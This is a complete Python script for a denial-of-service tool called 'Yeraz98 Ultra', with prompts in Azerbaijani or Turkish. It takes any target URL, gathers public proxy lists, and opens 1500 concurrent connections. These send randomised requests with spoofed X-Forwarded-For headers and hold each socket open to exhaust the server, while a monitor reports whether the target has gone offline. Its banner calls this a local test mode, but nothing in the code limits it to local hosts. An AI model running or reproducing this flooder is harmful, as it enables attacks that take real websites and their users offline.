import asyncio, random, ssl, aiohttp, os, re
from urllib.parse import urlparse

class Yeraz98Ultra:
    def __init__(self, target, intensity=1500):
        if not target.startswith(("http", "https")): target = "https://" + target
        p = urlparse(target)
        self.host, self.port = p.netloc, (p.port if p.port else (443 if p.scheme=="https" else 80))
        self.is_https, self.intensity = p.scheme == "https", intensity
        self.aktiv, self.conns, self.status = False, 0, "Proxy hazirlanir..."
        self.proxies = []
        self.methods = ["GET", "POST", "HEAD"]

    async def fetch_proxies(self):
        urls = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000",
            "https://www.proxy-list.download/api/v1/get?type=https",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
        ]
        async with aiohttp.ClientSession() as s:
            for url in urls:
                try:
                    async with s.get(url, timeout=5) as r:
                        lines = (await r.text()).splitlines()
                        self.proxies.extend([l.strip() for l in lines if ":" in l])
                except: continue
        print(f"\033[92m[+] {len(self.proxies)} eded aktiv proxy siyahisi hazirdir!\033[0m")

    async def check(self):
        async with aiohttp.ClientSession() as s:
            while self.aktiv:
                try:
                    async with s.get(f"{'https' if self.is_https else 'http'}://{self.host}", timeout=5) as r:
                        self.status = f"\033[92mOnline ({r.status})\033[0m" if r.status < 500 else f"\033[91mCOKUB ({r.status})\033[0m"
                except:
                    self.status = "\033[91mOFFLINE\033[0m"
                await asyncio.sleep(5)

    async def attack(self):
        while self.aktiv:
            w = None
            try:
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                _, w = await asyncio.open_connection(self.host, self.port, ssl=ctx if self.is_https else None)
                self.conns += 1
                method = random.choice(self.methods)
                ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                p_via = random.choice(self.proxies) if self.proxies else "127.0.0.1"
                
                payload = f"q={random.getrandbits(64)}" if method == "POST" else ""
                req = (f"{method} /?{random.getrandbits(32)} HTTP/1.1\r\n"
                       f"Host: {self.host}\r\n"
                       f"User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:120.0)\r\n"
                       f"X-Forwarded-For: {ip}\r\n"
                       f"Via: {p_via}\r\n"
                       f"Content-Type: application/x-www-form-urlencoded\r\n"
                       f"Content-Length: {len(payload)}\r\n"
                       f"Connection: keep-alive\r\n\r\n{payload}")
                
                w.write(req.encode()); await w.drain()
                await asyncio.sleep(random.uniform(20, 50))
                self.conns -= 1
            except:
                if w: w.close()
                await asyncio.sleep(0.01)

    async def monitor(self):
        while self.aktiv:
            print(f"\r\033[95m[ULTRA] Kanal: {self.conns} | Durum: {self.status}\033[0m", end="")
            await asyncio.sleep(1)

    async def start(self):
        self.aktiv = True
        await self.fetch_proxies()
        os.system("clear")
        print(f"\033[1;91mYERAZ98 ULTRA v11.0 - LOKAL TEST REJIM\033[0m")
        print(f"\033[93mHedef: {self.host}\033[0m")
        await asyncio.gather(self.monitor(), self.check(), *[self.attack() for _ in range(self.intensity)])

if __name__ == "__main__":
    h = input("\033[1;96mHedef URL daxil edin: \033[0m").strip()
    if h:
        try: asyncio.run(Yeraz98Ultra(h).start())
        except KeyboardInterrupt: print("\nDayandirildi.")
    else:
        print("Xeta: Hedef bosh ola bilmez!")
